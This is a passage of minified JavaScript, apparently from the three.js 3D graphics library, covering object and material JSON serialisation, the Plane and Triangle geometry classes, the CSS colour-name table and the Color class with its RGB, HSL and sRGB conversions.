                if (i.uuid = this.uuid, i.type = this.type, "" !== this.name && (i.name = this.name), !0 === this.castShadow && (i.castShadow = !0), !0 === this.receiveShadow && (i.receiveShadow = !0), !1 === this.visible && (i.visible = !1), !1 === this.frustumCulled && (i.frustumCulled = !1), 0 !== this.renderOrder && (i.renderOrder = this.renderOrder), "{}" !== JSON.stringify(this.userData) && (i.userData = this.userData), i.layers = this.layers.mask, i.matrix = this.matrix.toArray(), !1 === this.matrixAutoUpdate && (i.matrixAutoUpdate = !1), this.isInstancedMesh && (i.type = "InstancedMesh", i.count = this.count, i.instanceMatrix = this.instanceMatrix.toJSON()), this.isMesh || this.isLine || this.isPoints) {
                    i.geometry = r(e.geometries, this.geometry);
                    const t = this.geometry.parameters;
                    if (void 0 !== t && void 0 !== t.shapes) {
                        const n = t.shapes;
                        if (Array.isArray(n))
                            for (let t = 0, i = n.length; t < i; t++) {
                                const i = n[t];
                                r(e.shapes, i)
                            } else r(e.shapes, n)
                    }
                }
                if (this.isSkinnedMesh && (i.bindMode = this.bindMode, i.bindMatrix = this.bindMatrix.toArray(), void 0 !== this.skeleton && (r(e.skeletons, this.skeleton), i.skeleton = this.skeleton.uuid)), void 0 !== this.material)
                    if (Array.isArray(this.material)) {
                        const t = [];
                        for (let n = 0, i = this.material.length; n < i; n++) t.push(r(e.materials, this.material[n]));
                        i.material = t
                    } else i.material = r(e.materials, this.material);
                if (this.children.length > 0) { i.children = []; for (let t = 0; t < this.children.length; t++) i.children.push(this.children[t].toJSON(e).object) }
                if (this.animations.length > 0) {
                    i.animations = [];
                    for (let t = 0; t < this.animations.length; t++) {
                        const n = this.animations[t];
                        i.animations.push(r(e.animations, n))
                    }
                }
                if (t) {
                    const t = a(e.geometries),
                        i = a(e.materials),
                        r = a(e.textures),
                        o = a(e.images),
                        s = a(e.shapes),
                        l = a(e.skeletons),
                        c = a(e.animations);
                    t.length > 0 && (n.geometries = t), i.length > 0 && (n.materials = i), r.length > 0 && (n.textures = r), o.length > 0 && (n.images = o), s.length > 0 && (n.shapes = s), l.length > 0 && (n.skeletons = l), c.length > 0 && (n.animations = c)
                }
                return n.object = i, n;

                function a(e) {
                    const t = [];
                    for (const n in e) {
                        const i = e[n];
                        delete i.metadata, t.push(i)
                    }
                    return t
                }
            },
            clone: function(e) { return (new this.constructor).copy(this, e) },
            copy: function(e, t = !0) {
                if (this.name = e.name, this.up.copy(e.up), this.position.copy(e.position), this.rotation.order = e.rotation.order, this.quaternion.copy(e.quaternion), this.scale.copy(e.scale), this.matrix.copy(e.matrix), this.matrixWorld.copy(e.matrixWorld), this.matrixAutoUpdate = e.matrixAutoUpdate, this.matrixWorldNeedsUpdate = e.matrixWorldNeedsUpdate, this.layers.mask = e.layers.mask, this.visible = e.visible, this.castShadow = e.castShadow, this.receiveShadow = e.receiveShadow, this.frustumCulled = e.frustumCulled, this.renderOrder = e.renderOrder, this.userData = JSON.parse(JSON.stringify(e.userData)), !0 === t)
                    for (let t = 0; t < e.children.length; t++) {
                        const n = e.children[t];
                        this.add(n.clone())
                    }
                return this
            }
        });
        const bt = new be,
            wt = new be,
            Mt = new de;
        class Tt {
            constructor(e = new be(1, 0, 0), t = 0) { this.normal = e, this.constant = t }
            set(e, t) { return this.normal.copy(e), this.constant = t, this }
            setComponents(e, t, n, i) { return this.normal.set(e, t, n), this.constant = i, this }
            setFromNormalAndCoplanarPoint(e, t) { return this.normal.copy(e), this.constant = -t.dot(this.normal), this }
            setFromCoplanarPoints(e, t, n) { const i = bt.subVectors(n, t).cross(wt.subVectors(e, t)).normalize(); return this.setFromNormalAndCoplanarPoint(i, e), this }
            copy(e) { return this.normal.copy(e.normal), this.constant = e.constant, this }
            normalize() { const e = 1 / this.normal.length(); return this.normal.multiplyScalar(e), this.constant *= e, this }
            negate() { return this.constant *= -1, this.normal.negate(), this }
            distanceToPoint(e) { return this.normal.dot(e) + this.constant }
            distanceToSphere(e) { return this.distanceToPoint(e.center) - e.radius }
            projectPoint(e, t) { return void 0 === t && (console.warn("THREE.Plane: .projectPoint() target is now required"), t = new be), t.copy(this.normal).multiplyScalar(-this.distanceToPoint(e)).add(e) }
            intersectLine(e, t) {
                void 0 === t && (console.warn("THREE.Plane: .intersectLine() target is now required"), t = new be);
                const n = e.delta(bt),
                    i = this.normal.dot(n);
                if (0 === i) return 0 === this.distanceToPoint(e.start) ? t.copy(e.start) : void 0;
                const r = -(e.start.dot(this.normal) + this.constant) / i;
                return r < 0 || r > 1 ? void 0 : t.copy(n).multiplyScalar(r).add(e.start)
            }
            intersectsLine(e) {
                const t = this.distanceToPoint(e.start),
                    n = this.distanceToPoint(e.end);
                return t < 0 && n > 0 || n < 0 && t > 0
            }
            intersectsBox(e) { return e.intersectsPlane(this) }
            intersectsSphere(e) { return e.intersectsPlane(this) }
            coplanarPoint(e) { return void 0 === e && (console.warn("THREE.Plane: .coplanarPoint() target is now required"), e = new be), e.copy(this.normal).multiplyScalar(-this.constant) }
            applyMatrix4(e, t) {
                const n = t || Mt.getNormalMatrix(e),
                    i = this.coplanarPoint(bt).applyMatrix4(e),
                    r = this.normal.applyMatrix3(n).normalize();
                return this.constant = -i.dot(r), this
            }
            translate(e) { return this.constant -= e.dot(this.normal), this }
            equals(e) { return e.normal.equals(this.normal) && e.constant === this.constant }
            clone() { return (new this.constructor).copy(this) }
        }
        Tt.prototype.isPlane = !0;
        const Et = new be,
            St = new be,
            Lt = new be,
            At = new be,
            Rt = new be,
            Pt = new be,
            Ct = new be,
            Dt = new be,
            Nt = new be,
            It = new be;
        class Ot {
            constructor(e = new be, t = new be, n = new be) { this.a = e, this.b = t, this.c = n }
            static getNormal(e, t, n, i) { void 0 === i && (console.warn("THREE.Triangle: .getNormal() target is now required"), i = new be), i.subVectors(n, t), Et.subVectors(e, t), i.cross(Et); const r = i.lengthSq(); return r > 0 ? i.multiplyScalar(1 / Math.sqrt(r)) : i.set(0, 0, 0) }
            static getBarycoord(e, t, n, i, r) {
                Et.subVectors(i, t), St.subVectors(n, t), Lt.subVectors(e, t);
                const a = Et.dot(Et),
                    o = Et.dot(St),
                    s = Et.dot(Lt),
                    l = St.dot(St),
                    c = St.dot(Lt),
                    u = a * l - o * o;
                if (void 0 === r && (console.warn("THREE.Triangle: .getBarycoord() target is now required"), r = new be), 0 === u) return r.set(-2, -1, -1);
                const h = 1 / u,
                    d = (l * s - o * c) * h,
                    p = (a * c - o * s) * h;
                return r.set(1 - d - p, p, d)
            }
            static containsPoint(e, t, n, i) { return this.getBarycoord(e, t, n, i, At), At.x >= 0 && At.y >= 0 && At.x + At.y <= 1 }
            static getUV(e, t, n, i, r, a, o, s) { return this.getBarycoord(e, t, n, i, At), s.set(0, 0), s.addScaledVector(r, At.x), s.addScaledVector(a, At.y), s.addScaledVector(o, At.z), s }
            static isFrontFacing(e, t, n, i) { return Et.subVectors(n, t), St.subVectors(e, t), Et.cross(St).dot(i) < 0 }
            set(e, t, n) { return this.a.copy(e), this.b.copy(t), this.c.copy(n), this }
            setFromPointsAndIndices(e, t, n, i) { return this.a.copy(e[t]), this.b.copy(e[n]), this.c.copy(e[i]), this }
            clone() { return (new this.constructor).copy(this) }
            copy(e) { return this.a.copy(e.a), this.b.copy(e.b), this.c.copy(e.c), this }
            getArea() { return Et.subVectors(this.c, this.b), St.subVectors(this.a, this.b), .5 * Et.cross(St).length() }
            getMidpoint(e) { return void 0 === e && (console.warn("THREE.Triangle: .getMidpoint() target is now required"), e = new be), e.addVectors(this.a, this.b).add(this.c).multiplyScalar(1 / 3) }
            getNormal(e) { return Ot.getNormal(this.a, this.b, this.c, e) }
            getPlane(e) { return void 0 === e && (console.warn("THREE.Triangle: .getPlane() target is now required"), e = new Tt), e.setFromCoplanarPoints(this.a, this.b, this.c) }
            getBarycoord(e, t) { return Ot.getBarycoord(e, this.a, this.b, this.c, t) }
            getUV(e, t, n, i, r) { return Ot.getUV(e, this.a, this.b, this.c, t, n, i, r) }
            containsPoint(e) { return Ot.containsPoint(e, this.a, this.b, this.c) }
            isFrontFacing(e) { return Ot.isFrontFacing(this.a, this.b, this.c, e) }
            intersectsBox(e) { return e.intersectsTriangle(this) }
            closestPointToPoint(e, t) {
                void 0 === t && (console.warn("THREE.Triangle: .closestPointToPoint() target is now required"), t = new be);
                const n = this.a,
                    i = this.b,
                    r = this.c;
                let a, o;
                Rt.subVectors(i, n), Pt.subVectors(r, n), Dt.subVectors(e, n);
                const s = Rt.dot(Dt),
                    l = Pt.dot(Dt);
                if (s <= 0 && l <= 0) return t.copy(n);
                Nt.subVectors(e, i);
                const c = Rt.dot(Nt),
                    u = Pt.dot(Nt);
                if (c >= 0 && u <= c) return t.copy(i);
                const h = s * u - c * l;
                if (h <= 0 && s >= 0 && c <= 0) return a = s / (s - c), t.copy(n).addScaledVector(Rt, a);
                It.subVectors(e, r);
                const d = Rt.dot(It),
                    p = Pt.dot(It);
                if (p >= 0 && d <= p) return t.copy(r);
                const f = d * l - s * p;
                if (f <= 0 && l >= 0 && p <= 0) return o = l / (l - p), t.copy(n).addScaledVector(Pt, o);
                const m = c * p - d * u;
                if (m <= 0 && u - c >= 0 && d - p >= 0) return Ct.subVectors(r, i), o = (u - c) / (u - c + (d - p)), t.copy(i).addScaledVector(Ct, o);
                const g = 1 / (m + f + h);
                return a = f * g, o = h * g, t.copy(n).addScaledVector(Rt, a).addScaledVector(Pt, o)
            }
            equals(e) { return e.a.equals(this.a) && e.b.equals(this.b) && e.c.equals(this.c) }
        }
        let Ht = 0;

        function Ut() { Object.defineProperty(this, "id", { value: Ht++ }), this.uuid = ue.generateUUID(), this.name = "", this.type = "Material", this.fog = !0, this.blending = 1, this.side = 0, this.vertexColors = !1, this.opacity = 1, this.transparent = !1, this.blendSrc = 204, this.blendDst = 205, this.blendEquation = N, this.blendSrcAlpha = null, this.blendDstAlpha = null, this.blendEquationAlpha = null, this.depthFunc = 3, this.depthTest = !0, this.depthWrite = !0, this.stencilWriteMask = 255, this.stencilFunc = 519, this.stencilRef = 0, this.stencilFuncMask = 255, this.stencilFail = ie, this.stencilZFail = ie, this.stencilZPass = ie, this.stencilWrite = !1, this.clippingPlanes = null, this.clipIntersection = !1, this.clipShadows = !1, this.shadowSide = null, this.colorWrite = !0, this.precision = null, this.polygonOffset = !1, this.polygonOffsetFactor = 0, this.polygonOffsetUnits = 0, this.dithering = !1, this.alphaTest = 0, this.premultipliedAlpha = !1, this.visible = !0, this.toneMapped = !0, this.userData = {}, this.version = 0 }
        Ut.prototype = Object.assign(Object.create(se.prototype), {
            constructor: Ut,
            isMaterial: !0,
            onBeforeCompile: function() {},
            customProgramCacheKey: function() { return this.onBeforeCompile.toString() },
            setValues: function(e) {
                if (void 0 !== e)
                    for (const t in e) {
                        const n = e[t];
                        if (void 0 === n) { console.warn("THREE.Material: '" + t + "' parameter is undefined."); continue }
                        if ("shading" === t) { console.warn("THREE." + this.type + ": .shading has been removed. Use the boolean .flatShading instead."), this.flatShading = 1 === n; continue }
                        const i = this[t];
                        void 0 !== i ? i && i.isColor ? i.set(n) : i && i.isVector3 && n && n.isVector3 ? i.copy(n) : this[t] = n : console.warn("THREE." + this.type + ": '" + t + "' is not a property of this material.")
                    }
            },
            toJSON: function(e) {
                const t = void 0 === e || "string" == typeof e;
                t && (e = { textures: {}, images: {} });
                const n = { metadata: { version: 4.5, type: "Material", generator: "Material.toJSON" } };

                function i(e) {
                    const t = [];
                    for (const n in e) {
                        const i = e[n];
                        delete i.metadata, t.push(i)
                    }
                    return t
                }
                if (n.uuid = this.uuid, n.type = this.type, "" !== this.name && (n.name = this.name), this.color && this.color.isColor && (n.color = this.color.getHex()), void 0 !== this.roughness && (n.roughness = this.roughness), void 0 !== this.metalness && (n.metalness = this.metalness), this.sheen && this.sheen.isColor && (n.sheen = this.sheen.getHex()), this.emissive && this.emissive.isColor && (n.emissive = this.emissive.getHex()), this.emissiveIntensity && 1 !== this.emissiveIntensity && (n.emissiveIntensity = this.emissiveIntensity), this.specular && this.specular.isColor && (n.specular = this.specular.getHex()), void 0 !== this.shininess && (n.shininess = this.shininess), void 0 !== this.clearcoat && (n.clearcoat = this.clearcoat), void 0 !== this.clearcoatRoughness && (n.clearcoatRoughness = this.clearcoatRoughness), this.clearcoatMap && this.clearcoatMap.isTexture && (n.clearcoatMap = this.clearcoatMap.toJSON(e).uuid), this.clearcoatRoughnessMap && this.clearcoatRoughnessMap.isTexture && (n.clearcoatRoughnessMap = this.clearcoatRoughnessMap.toJSON(e).uuid), this.clearcoatNormalMap && this.clearcoatNormalMap.isTexture && (n.clearcoatNormalMap = this.clearcoatNormalMap.toJSON(e).uuid, n.clearcoatNormalScale = this.clearcoatNormalScale.toArray()), this.map && this.map.isTexture && (n.map = this.map.toJSON(e).uuid), this.matcap && this.matcap.isTexture && (n.matcap = this.matcap.toJSON(e).uuid), this.alphaMap && this.alphaMap.isTexture && (n.alphaMap = this.alphaMap.toJSON(e).uuid), this.lightMap && this.lightMap.isTexture && (n.lightMap = this.lightMap.toJSON(e).uuid, n.lightMapIntensity = this.lightMapIntensity), this.aoMap && this.aoMap.isTexture && (n.aoMap = this.aoMap.toJSON(e).uuid, n.aoMapIntensity = this.aoMapIntensity), this.bumpMap && this.bumpMap.isTexture && (n.bumpMap = this.bumpMap.toJSON(e).uuid, n.bumpScale = this.bumpScale), this.normalMap && this.normalMap.isTexture && (n.normalMap = this.normalMap.toJSON(e).uuid, n.normalMapType = this.normalMapType, n.normalScale = this.normalScale.toArray()), this.displacementMap && this.displacementMap.isTexture && (n.displacementMap = this.displacementMap.toJSON(e).uuid, n.displacementScale = this.displacementScale, n.displacementBias = this.displacementBias), this.roughnessMap && this.roughnessMap.isTexture && (n.roughnessMap = this.roughnessMap.toJSON(e).uuid), this.metalnessMap && this.metalnessMap.isTexture && (n.metalnessMap = this.metalnessMap.toJSON(e).uuid), this.emissiveMap && this.emissiveMap.isTexture && (n.emissiveMap = this.emissiveMap.toJSON(e).uuid), this.specularMap && this.specularMap.isTexture && (n.specularMap = this.specularMap.toJSON(e).uuid), this.envMap && this.envMap.isTexture && (n.envMap = this.envMap.toJSON(e).uuid, n.reflectivity = this.reflectivity, n.refractionRatio = this.refractionRatio, void 0 !== this.combine && (n.combine = this.combine), void 0 !== this.envMapIntensity && (n.envMapIntensity = this.envMapIntensity)), this.gradientMap && this.gradientMap.isTexture && (n.gradientMap = this.gradientMap.toJSON(e).uuid), void 0 !== this.size && (n.size = this.size), void 0 !== this.sizeAttenuation && (n.sizeAttenuation = this.sizeAttenuation), 1 !== this.blending && (n.blending = this.blending), 0 !== this.side && (n.side = this.side), this.vertexColors && (n.vertexColors = !0), this.opacity < 1 && (n.opacity = this.opacity), !0 === this.transparent && (n.transparent = this.transparent), n.depthFunc = this.depthFunc, n.depthTest = this.depthTest, n.depthWrite = this.depthWrite, n.stencilWrite = this.stencilWrite, n.stencilWriteMask = this.stencilWriteMask, n.stencilFunc = this.stencilFunc, n.stencilRef = this.stencilRef, n.stencilFuncMask = this.stencilFuncMask, n.stencilFail = this.stencilFail, n.stencilZFail = this.stencilZFail, n.stencilZPass = this.stencilZPass, this.rotation && 0 !== this.rotation && (n.rotation = this.rotation), !0 === this.polygonOffset && (n.polygonOffset = !0), 0 !== this.polygonOffsetFactor && (n.polygonOffsetFactor = this.polygonOffsetFactor), 0 !== this.polygonOffsetUnits && (n.polygonOffsetUnits = this.polygonOffsetUnits), this.linewidth && 1 !== this.linewidth && (n.linewidth = this.linewidth), void 0 !== this.dashSize && (n.dashSize = this.dashSize), void 0 !== this.gapSize && (n.gapSize = this.gapSize), void 0 !== this.scale && (n.scale = this.scale), !0 === this.dithering && (n.dithering = !0), this.alphaTest > 0 && (n.alphaTest = this.alphaTest), !0 === this.premultipliedAlpha && (n.premultipliedAlpha = this.premultipliedAlpha), !0 === this.wireframe && (n.wireframe = this.wireframe), this.wireframeLinewidth > 1 && (n.wireframeLinewidth = this.wireframeLinewidth), "round" !== this.wireframeLinecap && (n.wireframeLinecap = this.wireframeLinecap), "round" !== this.wireframeLinejoin && (n.wireframeLinejoin = this.wireframeLinejoin), !0 === this.morphTargets && (n.morphTargets = !0), !0 === this.morphNormals && (n.morphNormals = !0), !0 === this.skinning && (n.skinning = !0), !0 === this.flatShading && (n.flatShading = this.flatShading), !1 === this.visible && (n.visible = !1), !1 === this.toneMapped && (n.toneMapped = !1), "{}" !== JSON.stringify(this.userData) && (n.userData = this.userData), t) {
                    const t = i(e.textures),
                        r = i(e.images);
                    t.length > 0 && (n.textures = t), r.length > 0 && (n.images = r)
                }
                return n
            },
            clone: function() { return (new this.constructor).copy(this) },
            copy: function(e) {
                this.name = e.name, this.fog = e.fog, this.blending = e.blending, this.side = e.side, this.vertexColors = e.vertexColors, this.opacity = e.opacity, this.transparent = e.transparent, this.blendSrc = e.blendSrc, this.blendDst = e.blendDst, this.blendEquation = e.blendEquation, this.blendSrcAlpha = e.blendSrcAlpha, this.blendDstAlpha = e.blendDstAlpha, this.blendEquationAlpha = e.blendEquationAlpha, this.depthFunc = e.depthFunc, this.depthTest = e.depthTest, this.depthWrite = e.depthWrite, this.stencilWriteMask = e.stencilWriteMask, this.stencilFunc = e.stencilFunc, this.stencilRef = e.stencilRef, this.stencilFuncMask = e.stencilFuncMask, this.stencilFail = e.stencilFail, this.stencilZFail = e.stencilZFail, this.stencilZPass = e.stencilZPass, this.stencilWrite = e.stencilWrite;
                const t = e.clippingPlanes;
                let n = null;
                if (null !== t) {
                    const e = t.length;
                    n = new Array(e);
                    for (let i = 0; i !== e; ++i) n[i] = t[i].clone()
                }
                return this.clippingPlanes = n, this.clipIntersection = e.clipIntersection, this.clipShadows = e.clipShadows, this.shadowSide = e.shadowSide, this.colorWrite = e.colorWrite, this.precision = e.precision, this.polygonOffset = e.polygonOffset, this.polygonOffsetFactor = e.polygonOffsetFactor, this.polygonOffsetUnits = e.polygonOffsetUnits, this.dithering = e.dithering, this.alphaTest = e.alphaTest, this.premultipliedAlpha = e.premultipliedAlpha, this.visible = e.visible, this.toneMapped = e.toneMapped, this.userData = JSON.parse(JSON.stringify(e.userData)), this
            },
            dispose: function() { this.dispatchEvent({ type: "dispose" }) }
        }), Object.defineProperty(Ut.prototype, "needsUpdate", { set: function(e) {!0 === e && this.version++ } });
        const Ft = { aliceblue: 15792383, antiquewhite: 16444375, aqua: 65535, aquamarine: 8388564, azure: 15794175, beige: 16119260, bisque: 16770244, black: 0, blanchedalmond: 16772045, blue: 255, blueviolet: 9055202, brown: 10824234, burlywood: 14596231, cadetblue: 6266528, chartreuse: 8388352, chocolate: 13789470, coral: 16744272, cornflowerblue: 6591981, cornsilk: 16775388, crimson: 14423100, cyan: 65535, darkblue: 139, darkcyan: 35723, darkgoldenrod: 12092939, darkgray: 11119017, darkgreen: 25600, darkgrey: 11119017, darkkhaki: 12433259, darkmagenta: 9109643, darkolivegreen: 5597999, darkorange: 16747520, darkorchid: 10040012, darkred: 9109504, darksalmon: 15308410, darkseagreen: 9419919, darkslateblue: 4734347, darkslategray: 3100495, darkslategrey: 3100495, darkturquoise: 52945, darkviolet: 9699539, deeppink: 16716947, deepskyblue: 49151, dimgray: 6908265, dimgrey: 6908265, dodgerblue: 2003199, firebrick: 11674146, floralwhite: 16775920, forestgreen: 2263842, fuchsia: 16711935, gainsboro: 14474460, ghostwhite: 16316671, gold: 16766720, goldenrod: 14329120, gray: 8421504, green: 32768, greenyellow: 11403055, grey: 8421504, honeydew: 15794160, hotpink: 16738740, indianred: 13458524, indigo: 4915330, ivory: 16777200, khaki: 15787660, lavender: 15132410, lavenderblush: 16773365, lawngreen: 8190976, lemonchiffon: 16775885, lightblue: 11393254, lightcoral: 15761536, lightcyan: 14745599, lightgoldenrodyellow: 16448210, lightgray: 13882323, lightgreen: 9498256, lightgrey: 13882323, lightpink: 16758465, lightsalmon: 16752762, lightseagreen: 2142890, lightskyblue: 8900346, lightslategray: 7833753, lightslategrey: 7833753, lightsteelblue: 11584734, lightyellow: 16777184, lime: 65280, limegreen: 3329330, linen: 16445670, magenta: 16711935, maroon: 8388608, mediumaquamarine: 6737322, mediumblue: 205, mediumorchid: 12211667, mediumpurple: 9662683, mediumseagreen: 3978097, mediumslateblue: 8087790, mediumspringgreen: 64154, mediumturquoise: 4772300, mediumvioletred: 13047173, midnightblue: 1644912, mintcream: 16121850, mistyrose: 16770273, moccasin: 16770229, navajowhite: 16768685, navy: 128, oldlace: 16643558, olive: 8421376, olivedrab: 7048739, orange: 16753920, orangered: 16729344, orchid: 14315734, palegoldenrod: 15657130, palegreen: 10025880, paleturquoise: 11529966, palevioletred: 14381203, papayawhip: 16773077, peachpuff: 16767673, peru: 13468991, pink: 16761035, plum: 14524637, powderblue: 11591910, purple: 8388736, rebeccapurple: 6697881, red: 16711680, rosybrown: 12357519, royalblue: 4286945, saddlebrown: 9127187, salmon: 16416882, sandybrown: 16032864, seagreen: 3050327, seashell: 16774638, sienna: 10506797, silver: 12632256, skyblue: 8900331, slateblue: 6970061, slategray: 7372944, slategrey: 7372944, snow: 16775930, springgreen: 65407, steelblue: 4620980, tan: 13808780, teal: 32896, thistle: 14204888, tomato: 16737095, turquoise: 4251856, violet: 15631086, wheat: 16113331, white: 16777215, whitesmoke: 16119285, yellow: 16776960, yellowgreen: 10145074 },
            zt = { h: 0, s: 0, l: 0 },
            Bt = { h: 0, s: 0, l: 0 };

        function Gt(e, t, n) { return n < 0 && (n += 1), n > 1 && (n -= 1), n < 1 / 6 ? e + 6 * (t - e) * n : n < .5 ? t : n < 2 / 3 ? e + 6 * (t - e) * (2 / 3 - n) : e }

        function kt(e) { return e < .04045 ? .0773993808 * e : Math.pow(.9478672986 * e + .0521327014, 2.4) }

        function Vt(e) { return e < .0031308 ? 12.92 * e : 1.055 * Math.pow(e, .41666) - .055 }
        class Wt {
            constructor(e, t, n) { return void 0 === t && void 0 === n ? this.set(e) : this.setRGB(e, t, n) }
            set(e) { return e && e.isColor ? this.copy(e) : "number" == typeof e ? this.setHex(e) : "string" == typeof e && this.setStyle(e), this }
            setScalar(e) { return this.r = e, this.g = e, this.b = e, this }
            setHex(e) { return e = Math.floor(e), this.r = (e >> 16 & 255) / 255, this.g = (e >> 8 & 255) / 255, this.b = (255 & e) / 255, this }
            setRGB(e, t, n) { return this.r = e, this.g = t, this.b = n, this }
            setHSL(e, t, n) {
                if (e = ue.euclideanModulo(e, 1), t = ue.clamp(t, 0, 1), n = ue.clamp(n, 0, 1), 0 === t) this.r = this.g = this.b = n;
                else {
                    const i = n <= .5 ? n * (1 + t) : n + t - n * t,
                        r = 2 * n - i;
                    this.r = Gt(r, i, e + 1 / 3), this.g = Gt(r, i, e), this.b = Gt(r, i, e - 1 / 3)
                }
                return this
            }
            setStyle(e) {
                function t(t) { void 0 !== t && parseFloat(t) < 1 && console.warn("THREE.Color: Alpha component of " + e + " will be ignored.") }
                let n;
                if (n = /^((?:rgb|hsl)a?)\(([^\)]*)\)/.exec(e)) {
                    let e;
                    const i = n[1],
                        r = n[2];
                    switch (i) {
                        case "rgb":
                        case "rgba":
                            if (e = /^\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(r)) return this.r = Math.min(255, parseInt(e[1], 10)) / 255, this.g = Math.min(255, parseInt(e[2], 10)) / 255, this.b = Math.min(255, parseInt(e[3], 10)) / 255, t(e[4]), this;
                            if (e = /^\s*(\d+)\%\s*,\s*(\d+)\%\s*,\s*(\d+)\%\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(r)) return this.r = Math.min(100, parseInt(e[1], 10)) / 100, this.g = Math.min(100, parseInt(e[2], 10)) / 100, this.b = Math.min(100, parseInt(e[3], 10)) / 100, t(e[4]), this;
                            break;
                        case "hsl":
                        case "hsla":
                            if (e = /^\s*(\d*\.?\d+)\s*,\s*(\d+)\%\s*,\s*(\d+)\%\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(r)) {
                                const n = parseFloat(e[1]) / 360,
                                    i = parseInt(e[2], 10) / 100,
                                    r = parseInt(e[3], 10) / 100;
                                return t(e[4]), this.setHSL(n, i, r)
                            }
                    }
                } else if (n = /^\#([A-Fa-f\d]+)$/.exec(e)) {
                    const e = n[1],
                        t = e.length;
                    if (3 === t) return this.r = parseInt(e.charAt(0) + e.charAt(0), 16) / 255, this.g = parseInt(e.charAt(1) + e.charAt(1), 16) / 255, this.b = parseInt(e.charAt(2) + e.charAt(2), 16) / 255, this;
                    if (6 === t) return this.r = parseInt(e.charAt(0) + e.charAt(1), 16) / 255, this.g = parseInt(e.charAt(2) + e.charAt(3), 16) / 255, this.b = parseInt(e.charAt(4) + e.charAt(5), 16) / 255, this
                }
                return e && e.length > 0 ? this.setColorName(e) : this
            }
            setColorName(e) { const t = Ft[e]; return void 0 !== t ? this.setHex(t) : console.warn("THREE.Color: Unknown color " + e), this }
            clone() { return new this.constructor(this.r, this.g, this.b) }
            copy(e) { return this.r = e.r, this.g = e.g, this.b = e.b, this }
            copyGammaToLinear(e, t = 2) { return this.r = Math.pow(e.r, t), this.g = Math.pow(e.g, t), this.b = Math.pow(e.b, t), this }
            copyLinearToGamma(e, t = 2) { const n = t > 0 ? 1 / t : 1; return this.r = Math.pow(e.r, n), this.g = Math.pow(e.g, n), this.b = Math.pow(e.b, n), this }
            convertGammaToLinear(e) { return this.copyGammaToLinear(this, e), this }
            convertLinearToGamma(e) { return this.copyLinearToGamma(this, e), this }
            copySRGBToLinear(e) { return this.r = kt(e.r), this.g = kt(e.g), this.b = kt(e.b), this }
            copyLinearToSRGB(e) { return this.r = Vt(e.r), this.g = Vt(e.g), this.b = Vt(e.b), this }
            convertSRGBToLinear() { return this.copySRGBToLinear(this), this }
            convertLinearToSRGB() { return this.copyLinearToSRGB(this), this }
            getHex() { return 255 * this.r << 16 ^ 255 * this.g << 8 ^ 255 * this.b }
            getHexString() { return ("000000" + this.getHex().toString(16)).slice(-6) }
            getHSL(e) {
                void 0 === e && (console.warn("THREE.Color: .getHSL() target is now required"), e = { h: 0, s: 0, l: 0 });
                const t = this.r,
                    n = this.g,
                    i = this.b,
                    r = Math.max(t, n, i),
                    a = Math.min(t, n, i);
                let o, s;
                const l = (a + r) / 2;
                if (a === r) o = 0, s = 0;
                else {
                    const e = r - a;
                    switch (s = l <= .5 ? e / (r + a) : e / (2 - r - a), r) {
                        case t:
                            o = (n - i) / e + (n < i ? 6 : 0);
                            break;
                        case n:
                            o = (i - t) / e + 2;
                            break;
                        case i:
                            o = (t - n) / e + 4
                    }
                    o /= 6
                }
                return e.h = o, e.s = s, e.l = l, e
            }
            getStyle() { return "rgb(" + (255 * this.r | 0) + "," + (255 * this.g | 0) + "," + (255 * this.b | 0) + ")" }
            offsetHSL(e, t, n) { return this.getHSL(zt), zt.h += e, zt.s += t, zt.l += n, this.setHSL(zt.h, zt.s, zt.l), this }
            add(e) { return this.r += e.r, this.g += e.g, this.b += e.b, this }
            addColors(e, t) { return this.r = e.r + t.r, this.g = e.g + t.g, this.b = e.b + t.b, this }
            addScalar(e) { return this.r += e, this.g += e, this.b += e, this }
            sub(e) { return this.r = Math.max(0, this.r - e.r), this.g = Math.max(0, this.g - e.g), this.b = Math.max(0, this.b - e.b), this }
            multiply(e) { return this.r *= e.r, this.g *= e.g, this.b *= e.b, this }
            multiplyScalar(e) { return this.r *= e, this.g *= e, this.b *= e, this }
            lerp(e, t) { return this.r += (e.r - this.r) * t, this.g += (e.g - this.g) * t, this.b += (e.b - this.b) * t, this }
            lerpColors(e, t, n) { return this.r = e.r + (t.r - e.r) * n, this.g = e.g + (t.g - e.g) * n, this.b = e.b + (t.b - e.b) * n, this }
            lerpHSL(e, t) {
                this.getHSL(zt), e.getHSL(Bt);
                const n = ue.lerp(zt.h, Bt.h, t),
                    i = ue.lerp(zt.s, Bt.s, t),
                    r = ue.lerp(zt.l, Bt.l, t);
                return this.setHSL(n, i, r), this
            }
            equals(e) { return e.r === this.r && e.g === this.g && e.b === this.b }
            fromArray(e, t = 0) { return this.r = e[t], this.g = e[t + 1], this.b = e[t + 2], this }
            toArray(e = [], t = 0) { return e[t] = this.r, e[t + 1] = this.g, e[t + 2] = this.b, e }
            fromBufferAttribute(e, t) { return this.r = e.getX(t), this.g = e.getY(t), this.b = e.getZ(t), !0 === e.normalized && (this.r /= 255, this.g /= 255, this.b /= 255), this }
            toJSON() { return this.getHex() }
        }
        Wt.NAMES = Ft, Wt.prototype.isColor = !0, Wt.prototype.r = 1, Wt.prototype.g = 1, Wt.prototype.b = 1;
        class jt extends Ut {
            constructor(e) { super(), this.type = "MeshBasicMaterial", this.color = new Wt(16777215), this.map = null, this.lightMap = null, this.lightMapIntensity = 1, this.aoMap = null, this.aoMapIntensity = 1, this.specularMap = null, this.alphaMap = null, this.envMap = null, this.combine = 0, this.reflectivity = 1, this.refractionRatio = .98, this.wireframe = !1, this.wireframeLinewidth = 1, this.wireframeLinecap = "round", this.wireframeLinejoin = "round", this.skinning = !1, this.morphTargets = !1, this.setValues(e) }
            copy(e) { return super.copy(e), this.color.copy(e.color), this.map = e.map, this.lightMap = e.lightMap, this.lightMapIntensity = e.lightMapIntensity, this.aoMap = e.aoMap, this.aoMapIntensity = e.aoMapIntensity, this.specularMap = e.specularMap, this.alphaMap = e.alphaMap, this.envMap = e.envMap, this.combine = e.combine, this.reflectivity = e.reflectivity, this.refractionRatio = e.refractionRatio, this.wireframe = e.wireframe, this.wireframeLinewidth = e.wireframeLinewidth, this.wireframeLinecap = e.wireframeLinecap, this.wireframeLinejoin = e.wireframeLinejoin, this.skinning = e.skinning, this.morphTargets = e.morphTargets, this }
        }
